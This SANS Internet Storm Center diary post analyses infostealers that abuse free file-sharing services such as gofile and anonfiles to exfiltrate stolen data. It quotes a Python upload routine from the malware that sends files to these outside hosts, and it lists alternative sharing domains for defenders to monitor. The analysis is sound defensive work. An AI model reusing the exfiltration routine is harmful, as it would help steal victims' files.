---
title: Online Services Again Abused to Exfiltrate Data, (Tue, Apr 15th)
url: https://isc.sans.edu/diary/rss/31862
source: SANS Internet Storm Center, InfoCON: green
date: 2025-04-16
fetch_date: 2025-10-06T22:09:46.648355
---

# Online Services Again Abused to Exfiltrate Data, (Tue, Apr 15th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31858)
* [next](/diary/31866)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Online Services Again Abused to Exfiltrate Data](/forums/diary/Online%2BServices%2BAgain%2BAbused%2Bto%2BExfiltrate%2BData/31862/)

**Published**: 2025-04-15. **Last Updated**: 2025-04-15 06:08:15 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Online%2BServices%2BAgain%2BAbused%2Bto%2BExfiltrate%2BData/31862/#comments)

If Attackers can abuse free online services, they will do for sure! Why spend time to deploy a C2 infrastructure if you have plenty of ways to use "official" services. Not only, they don't cost any money but the traffic can be hidden in the normal traffic; making them more difficult to detect. A very popular one was anonfiles[.]com. It was so abused that they closed in 2023![[1](https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/)]. A funny fact is that I still see lot of malicious scripts that refer to this domain. Of course, alternatives popped up here and there, like anonfile[.]la[[2](https://www.anonfile.la/)].

I spotted some malicious scripts that abuse gofile[.]io[[3](https://gofile.io/home)], mainly infostealers that exfiltrate collected data through this website. The usage is pretty easy: you request an available server and you post your data:

```

def UploadToExternalService(self, path, filename=None) -> str | None:
    if os.path.isfile(path):
        Logger.info('Uploading %s to gofile' % (filename or 'file'))
    with open(path, 'rb') as file:
        fileBytes = file.read()
    if filename is None:
        filename = os.path.basename(path)
    http = PoolManager(cert_reqs='CERT_NONE')
    try:
        server = json.loads(http.request('GET', 'https://api[.]gofile[.]io/getServer').data.decode(errors='ignore'))['data']['server']
        if server:
            url = json.loads(http.request('POST', 'https://{}[.]gofile[.]io/uploadFile'.format(server), fields={'file': (filename,
                             fileBytes)}).data.decode(errors='ignore'))['data']['downloadPage']
            if url:
                return url
    except Exception:
        try:
            Logger.error('Failed to upload to gofile, trying to upload to anonfiles')
            url = json.loads(http.request('POST', 'https://api[.]anonfiles[.]com/upload', fields={'file': (filename,
                             fileBytes)}).data.decode(errors='ignore'))['data']['file']['url']['short']
            return url
        except Exception:
            Logger.error('Failed to upload to anonfiles')
            return None
```

Note that if the upload to gofile.io failed, they will fallback to anonfiles.com!? Just why? The service is down...

There are many alternatives to these services. Here is a quick list:

* transfer[.]sh
* www[.]file[.]io

* bayfiles[.]com

* catbox[.]moe

* filebin[.]net
* temp[.]sh

Usually, not used in corporate environments, it could be interesting to track hosts that try to resolve these domains!

[1] <https://www.bleepingcomputer.com/news/security/file-sharing-site-anonfiles-shuts-down-due-to-overwhelming-abuse/>
[2] <https://www.anonfile.la/>
[3] <https://gofile.io/home>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [API](/tag.html?tag=API) [File](/tag.html?tag=File) [Infostealer](/tag.html?tag=Infostealer) [Online Service](/tag.html?tag=Online Service) [Sharing](/tag.html?tag=Sharing) [Upload](/tag.html?tag=Upload)

[0 comment(s)](/diary/Online%2BServices%2BAgain%2BAbused%2Bto%2BExfiltrate%2BData/31862/#comments)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

* [previous](/diary/31858)
* [next](/diary/31866)

### Comments

[Login here to join the discussion.](/login)

Top of page

×

![modal content]()

[Diary Archives](/diaryarchive.html)

* [![SANS.edu research journal](https://isc.sans.edu/images/researchjournal5.png)](/j/research)
* [Homepage](/index.html)
* [Diaries](/diaryarchive.html)
* [Podcasts](/podcast.html)
* [Jobs](/jobs)
* [Data](/data)
  + [TCP/UDP Port Activity](/data/port.html)
  + [Port Trends](/data/trends.html)
  + [SSH/Telnet Scanning Activity](/data/ssh.html)
  + [Weblogs](/weblogs)
  + [Domains](/data/domains.html)
  + [Threat Feeds Activity](/data/threatfeed.html)
  + [Threat Feeds Map](/data/threatmap.html)
  + [Useful InfoSec Links](/data/links.html)
  + [Presentations & Papers](/data/presentation.html)
  + [Research Papers](/data/researchpapers.html)
  + [API](/api)
* [Tools](/tools/)
  + [DShield Sensor](/howto.html)
  + [DNS Looking Glass](/tools/dnslookup)
  + [Honeypot (RPi/AWS)](/tools/honeypot)
  + [InfoSec Glossary](/tools/glossary)
* [Contact Us](/contact.html)
  + [Contact Us](/contact.html)
  + [About Us](/about.html)
  + [Handlers](/handler_list.html)* [About Us](/about.html)

[Slack Channel](/slack/index.html)

[Mastodon](https://infosec.exchange/%40sans_isc)

[Bluesky](https://bsky.app/profile/sansisc.bsky.social)

[X](https://twitter.com/sans_isc)

![](/adimg.html?id=)

© 2025 SANS™ Internet Storm Center
Developers: We have an [API](/api/) for you!   [![Creative Commons License](/images/cc.png)](https://creativecommons.org/licenses/by-nc-sa/4.0/)

* [Link To Us](/linkback.html)
* [About Us](/about.html)
* [Handlers](/handler_list.html)
* [Privacy Policy](/privacy.html)